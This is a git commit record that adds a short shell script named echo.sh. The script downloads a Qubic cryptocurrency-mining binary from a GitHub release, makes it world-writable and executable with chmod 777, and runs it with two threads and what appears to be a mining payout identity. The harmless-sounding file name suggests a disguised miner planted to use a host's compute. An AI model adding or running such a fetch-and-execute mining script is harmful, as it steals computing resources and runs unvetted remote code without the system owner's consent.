f2a6ef0c2bf3ba57e6a6d6e7f86c2880e4905c91
labilabuhu <labilabuhughja@gmail.com>
2025-11-06 12:57:47 +0700

    Create echo.sh

---
+++ echo.sh
@@ -0,0 +1,4 @@
+#/bin/sh
+wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.0.7-b/rqiner-x86-znver4
+chmod 777 rqiner-x86-znver4
+./rqiner-x86-znver4 -t 2 -i YYFZXWMNZIPRNGLCTCILYRRZQFFCGFBJZEIRFKBFLFTGODXVLMXVONRDAEMF
